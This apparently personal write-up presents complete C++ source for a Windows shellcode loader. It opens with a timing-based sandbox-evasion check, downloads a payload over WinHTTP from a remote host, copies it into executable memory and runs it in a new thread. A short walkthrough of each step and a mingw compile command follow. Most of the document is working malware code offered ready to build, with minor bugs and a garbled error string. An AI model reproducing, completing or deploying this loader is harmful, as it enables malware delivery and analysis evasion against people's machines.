
This code is a **C++ Windows malware loader** — it bypasses dynamic analysis, downloads shellcode from a remote server, allocates memory, writes the shellcode into it, and executes it. Below is a breakdown of each part

```C++
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")

void BypassDynamicAnalysis()
{

	int tick = GetTickCount64();
	Sleep(5000);
	int tock = GetTickCount64();
	if ((tock - tick) < 4500)
		exit(0);
}

std::vector<BYTE> Download(LPCWSTR baseAddress,int port,LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);


    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    WinHttpReceiveResponse(
        hRequest,
        NULL);

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
	return wString;
}

int main(int argc, char* argv[])
{
    BypassDynamicAnalysis();
    std::vector<BYTE> recvbuf;
    recvbuf = Download(L"ip", std::stoi("port"), L"/test.bin");
    
	LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!alloc_mem) {
		printf("Well... it failed! (%u)\n", GetLastError());
		return -1;
	}

	CopyMemory(alloc_mem, recvbuf.data(), recvbuf.size());

	DWORD oldProtect;
	if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed sd asd asd asdto change memory protection (%u)\n", GetLastError());
		return -2;
	}

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed thread (%u)\n", GetLastError());
		return -3;
	}
	printf("\n\nalloc_mem address : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	((void(*)())alloc_mem)();

	return 0;

}
```



```
void BypassDynamicAnalysis()
{
    int tick = GetTickCount64();
    Sleep(5000);
    int tock = GetTickCount64();
    if ((tock - tick) < 4500)
        exit(0);
}

```

Detects if it's running in a sandbox or under analysis by checking whether the `Sleep(5000)` actually delays for 5 seconds.

```
wchar_t* CharArrayToLPCWSTR(const char* array)

```

- Converts a regular `char*` string to `LPCWSTR`.
    
- Not actually used in this code right now, could be for future dynamic inputs.

```
LPVOID alloc_mem = VirtualAlloc(...);
CopyMemory(...);
VirtualProtect(...);
CreateThread(...);
```

- **`VirtualAlloc`**: Allocates memory with `PAGE_EXECUTE_READWRITE`.
    
- **`CopyMemory`**: Copies the downloaded shellcode into the allocated buffer.
    
- **`VirtualProtect`**: Changes the memory to `PAGE_EXECUTE_READ`, reducing detection risk.
    
- **`CreateThread`**: Executes the shellcode in a new thread.
    
- **`WaitForSingleObject`**: Waits for the shellcode thread to finish execution.


Now, we can perform the compilation as follows:

```
x86_64-w64-mingw32-g++ --static webloader.cpp -o webloader.exe -lwinhttp -fpermissive
```


![[Screenshot From 2025-04-18 16-06-06.png]]


![[Pasted image 20250418160619.png]]

